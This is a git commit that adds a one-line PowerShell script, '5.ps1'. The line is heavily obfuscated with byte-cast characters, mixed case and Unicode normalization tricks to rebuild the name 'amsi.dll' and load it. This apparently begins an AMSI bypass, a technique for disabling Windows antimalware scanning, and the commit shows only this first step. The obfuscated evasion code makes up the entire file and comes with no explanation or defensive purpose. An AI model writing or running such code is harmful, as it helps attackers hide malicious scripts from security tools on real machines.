ba61958571a0286debdf24a1e3f5b825b33d4440
1l1l1l1l <99437557+1l1l1l1l@users.noreply.github.com>
2022-02-10 22:34:51 +0100

    Add files via upload

---
+++ 5.ps1
@@ -0,0 +1,1 @@
+$cnqlwvq = [hnkwv]::LoadLibrary("$(('àmsì.'+'dll').NorMaLiZe([cHar]([BYte]0x46)+[ChaR]([ByTE]0x6f)+[ChaR]([Byte]0x72)+[CHar]([bytE]0x6d)+[chAr]([bYtE]0x44)) -replace [chAR]([byTE]0x5c)+[Char]([bYtE]0x70)+[ChAR]([bYTe]0x7b)+[ChAr](77+60-60)+[char]([bYtE]0x6e)+[CHAR]([bYtE]0x7d))")
